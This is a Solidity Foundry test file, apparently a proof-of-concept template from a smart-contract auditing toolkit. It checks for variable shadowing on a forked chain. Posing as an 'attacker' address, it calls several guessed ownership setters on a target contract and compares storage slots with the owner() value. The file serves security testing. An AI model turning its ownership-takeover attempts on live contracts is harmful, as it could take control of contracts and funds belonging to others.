// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Variable shadowing (write lands in the wrong var)
/// @notice Detector: shadowing. A function parameter / local / derived
///         variable SHADOWS a state variable, so a write the caller thinks
///         updates the state variable actually updates the shadow -- and
///         every other function keeps reading the ORIGINAL, unchanged value.
///         State diverges: the setter "succeeds" but nothing changes.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt setOwner() / owner() to the
///      target's real shadowed setter / getter.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// Fingerprint of the first few slots, so "the write landed somewhere else"
    /// is distinguishable from "nothing happened at all". Without this, a no-op
    /// setter would look exactly like a shadowed one.
    function _slots() internal view returns (bytes32[8] memory out) {
        for (uint256 i = 0; i < 8; i++) {
            out[i] = vm.load(target, bytes32(i));
        }
    }

    /// One setter attempt. Success is a SLOT MOVING — the shadowed variable
    /// taking the write — never the call returning.
    function _setterOnce(address attacker, bytes32[8] memory before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (!ok) return "";
        bytes32[8] memory after_ = _slots();
        for (uint256 i = 0; i < 8; i++) {
            if (after_[i] != before[i]) return label;
        }
        return "";
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        (bool ownerOk, bytes memory beforeRet) =
            target.staticcall(abi.encodeWithSignature("owner()"));
        require(
            ownerOk,
            "target has no owner() view, so the visible value cannot be compared. This does NOT establish safety."
        );
        address ownerBefore = abi.decode(beforeRet, (address));

        bytes32[8] memory before = _slots();

        // The setter is a GUESS on an unverified target.
        string memory used;
        bytes memory d;
        d = abi.encodeWithSignature("setOwner(address)", attackerEOA);
        used = _setterOnce(attackerEOA, before, "setOwner(address)", d);
        if (bytes(used).length == 0) {
            d = abi.encodeWithSignature("_setOwner(address)", attackerEOA);
            used = _setterOnce(attackerEOA, before, "_setOwner(address)", d);
        }
        if (bytes(used).length == 0) {
            d = abi.encodeWithSignature("transferOwnership(address)", attackerEOA);
            used = _setterOnce(attackerEOA, before, "transferOwnership(address)", d);
        }
        if (bytes(used).length == 0) {
            d = abi.encodeWithSignature("setAdmin(address)", attackerEOA);
            used = _setterOnce(attackerEOA, before, "setAdmin(address)", d);
        }
        if (bytes(used).length == 0) {
            d = abi.encodeWithSignature("set(address)", attackerEOA);
            used = _setterOnce(attackerEOA, before, "set(address)", d);
        }

        (bool ownerOk2, bytes memory afterRet) =
            target.staticcall(abi.encodeWithSignature("owner()"));
        address ownerAfter = ownerOk2 ? abi.decode(afterRet, (address)) : ownerBefore;
        console.log("setter that wrote a slot:", used);
        console.log("owner before setter:", ownerBefore);
        console.log("owner after setter:", ownerAfter);

        require(
            bytes(used).length > 0,
            "no setter wrote any slot. Tried setOwner(address), _setOwner(address), transferOwnership(address), setAdmin(address), set(address). This does NOT establish safety: the setter may be named differently or take other arguments."
        );
        // The finding: the write landed, but NOT in the variable the getter
        // reads — that is the shadow. Inverted on purpose, and documented here.
        assertEq(
            ownerAfter,
            ownerBefore,
            "the setter updated the visible owner, so nothing was shadowed. This does NOT establish safety: the mismatch may be on another member, or the write may have hit the real variable."
        );
    }
}
